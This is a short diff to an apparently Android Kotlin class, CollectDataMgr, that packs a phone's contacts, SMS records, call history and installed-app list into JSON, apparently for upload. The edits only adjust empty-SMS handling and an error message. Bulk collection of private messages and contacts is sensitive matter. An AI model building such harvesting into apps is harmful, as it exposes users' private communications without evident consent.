@@ -109,7 +109,7 @@ class CollectDataMgr {
             //通讯录json
             jsonObject.put("contacts", contractStr)
             //短信记录json
-            jsonObject.put("sms", smsStr)
+            jsonObject.put("sms", if (TextUtils.isEmpty(smsStr)) "" else smsStr)
             //通话记录json
             jsonObject.put("call", callRecordStr)
             //app安装列表json
@@ -310,7 +310,7 @@ class CollectDataMgr {
                     } else {
                         var errorMsg: String? = null
                         try {
-                            errorMsg = response.body().toString()
+                            errorMsg = GsonUtils.toJson(authBean)
                         } catch (e: Exception) {
 
                         }
